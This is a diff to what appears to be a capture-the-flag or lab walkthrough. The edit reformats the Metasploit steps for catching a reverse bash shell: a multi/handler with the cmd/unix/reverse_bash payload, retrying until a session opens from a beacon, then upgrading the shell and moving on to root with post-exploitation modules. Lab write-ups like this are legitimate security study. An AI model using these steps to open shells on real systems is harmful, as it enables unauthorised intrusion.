@@ -143,18 +143,19 @@ run
 
 start another metasploit and set the payload to cmd/unix/reverse_bash
 
+```
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp and the correct port and interface
 msf6 exploit(multi/handler) > set payload cmd/unix/reverse_bash
 payload => cmd/unix/reverse_bash
 
 run
+```
 Then run the http payload and wait.
-Soon we get "[*] Accepted the first client connection..." but thats not enough, no real shell is generated.
+If you get "Soon we get "[*] Accepted the first client connection..." you will have to try again.
+No real shell is connected. After some tries a real session will be opened and then we have shell from the beacon.
 
-and we have shell from the beacon
-
-type shell in metasploit to upgrade to proper bash shell.
+type 'shell' in metasploit to upgrade to proper bash shell.
 
 from there it's time to go for root, that is covered in other writeups. I tried with metasploit's post exploitation modules.
 
